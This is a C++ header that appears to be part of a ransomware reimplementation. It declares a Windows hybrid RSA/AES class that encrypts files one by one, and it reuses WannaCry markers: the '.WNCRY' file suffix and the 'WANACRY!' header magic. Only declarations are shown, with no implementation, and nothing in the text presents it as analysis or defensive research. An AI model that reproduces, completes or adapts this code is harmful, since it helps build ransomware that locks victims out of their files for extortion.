// HybridCrypt.h

#pragma once

#include <Windows.h>
#include <bcrypt.h>
#include <vector>
#include <string>

#include "EZAES.h"
#include "EZRSA.h"

#pragma comment(lib, "bcrypt.lib")

#define EZH_SRCBUFFERSIZE 0x10000
#define EZH_IOBUFFERSIZE 0x100000

#define EZH_SUFFIX_CIPHER _T(".WNCRY")
#define EZH_SUFFIX_TEMP _T(".WNCRY")

#define EZH_MAGIC "WANACRY!"
#define EZH_ENCRYPT 4

struct stEncHeader
{
	char cMagic[8];
	uint32_t nVersion;
	uint32_t nOriginalSize;
	uint32_t nEncKeySize;
	uint8_t abKey[16];
	uint8_t abIV[16];
};

class HybridCrypt
{
private:
	PEZRSA m_pEncRSA;
	PEZRSA m_pDecRSA;
	PUCHAR m_InBuffer;
	PUCHAR m_OutBuffer;

public:
	HybridCrypt();
	~HybridCrypt();

	BOOL fnGenKey();
	BOOL fnImportPublicKey(PUCHAR pbPublicBlob, ULONG cbPublicBlob);
	BOOL fnImportPublicKey(LPCTSTR pPublicBlobFile);
	BOOL fnImportPrivateKey(PUCHAR pbPrivateBlob, ULONG cbPrivateBlob);
	BOOL fnImportPrivateKey(LPCTSTR pPrivateBlobFile);

	BOOL fnEncrypt(LPCTSTR pFileName);
	BOOL fnDecrypt(LPCTSTR pFileName);
};

typedef HybridCrypt* PHybridCrypt;
